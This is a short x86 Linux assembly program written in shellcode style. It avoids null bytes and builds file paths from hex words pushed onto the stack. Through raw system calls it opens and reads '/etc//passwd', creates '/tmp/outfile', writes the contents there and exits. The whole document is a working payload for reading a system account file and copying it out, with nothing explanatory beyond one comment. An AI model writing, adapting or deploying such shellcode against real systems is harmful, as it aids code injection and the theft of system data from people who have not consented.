global _start
section .text
_start:
    xor eax, eax
    add al, 0x5
    mov ecx, eax
    push ecx
    push 0x64777373
    push 0x61702f2f
    push 0x6374652f    ;0x2f moved to get /etc//passwd
    mov ebx, esp
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    xor edx, edx
    dec dx
    int 0x80

    mov esi, eax

    xor eax, eax
    mov ecx, eax
    add al,0x5
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    xor eax, eax
    add al,0x4
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor ebx,ebx
    mov eax, ebx
    add al, 0x1
    add bl, 0x5
    int 0x80
